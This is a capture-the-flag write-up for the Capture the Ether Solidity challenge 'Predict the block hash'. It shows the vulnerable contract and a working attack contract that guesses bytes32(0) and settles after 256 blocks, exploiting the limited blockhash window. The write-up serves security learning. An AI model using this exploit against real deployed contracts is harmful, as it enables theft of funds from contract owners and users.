# Catch the Ether 6: Predict the block hash

Random numbers cannot be created inside solidity, oracles are suggested

## The Task Intro

Guessing an 8-bit number is apparently too easy. This time, you need to predict the entire 256-bit block hash for a future block.

## The Task Code

```apache
pragma solidity ^0.4.21;

contract PredictTheBlockHashChallenge {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    function PredictTheBlockHashChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        bytes32 answer = block.blockhash(settlementBlockNumber);

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```

## The Solution

The task is the same as before, but now the possible solution seem ridiculously high. So another approach is needed - scary task at first. After 30minutes staring at this code I realized I need to think out of the box. Jeff showed in his task sheet a hint, that we should check how the blockhash works.

The solution is that the blockhash in solidity is only saved for the last 256 blocks. I need to guess a bytes32(0) value and attack after 257 blocks passed.

Done again, again 🎉️. Being proud that I solved all these challenges and documenting these now.

```apache
contract Crack {
    PredictTheBlockHashChallenge ptbhc;
    uint256 settlementBlockNumber;

    function Crack(PredictTheBlockHashChallenge _ptbhc) public payable {
        require(msg.value == 1 ether);
        ptbhc = _ptbhc;
    }

    function guess() public {
        ptbhc.lockInGuess.value(1 ether)(bytes32(0));
        settlementBlockNumber = block.number + 1;
    }

    function attack() public {
        if (block.number > settlementBlockNumber) {
            ptbhc.settle();
        }
    }

    function() public payable {}

    function payback() public {
        msg.sender.transfer(2 ether);
    }
}
```
